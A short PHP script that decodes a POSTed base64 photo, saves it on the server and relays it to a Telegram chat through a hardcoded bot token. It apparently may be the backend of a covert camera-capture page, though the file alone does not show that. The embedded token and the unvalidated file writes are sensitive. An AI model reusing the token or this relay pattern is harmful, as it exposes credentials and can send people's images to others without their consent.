<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    $image = $data['image'];
    
    // Removing the data URL prefix
    $image = str_replace('data:image/png;base64,', '', $image);
    $image = str_replace(' ', '+', $image);
    $imageData = base64_decode($image);
    
    // Saving the image
    $filePath = 'photo_' . time() . '.png';
    file_put_contents($filePath, $imageData);

    // Sending the image to Telegram bot
    $botToken = '6842405654:AAH99JmO705M3oSQCxGnQYHBsAFp-VWrFuY';
    $chatId = '6389977474';
    $url = "https://api.telegram.org/bot$botToken/sendPhoto";

    $postFields = [
        'chat_id' => $chatId,
        'photo'   => new CURLFile(realpath($filePath))
    ];

    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields); 
    $result = curl_exec($ch); 
    curl_close($ch);

    echo json_encode(['status' => 'success', 'message' => 'Photo sent to Telegram bot']);
}
?>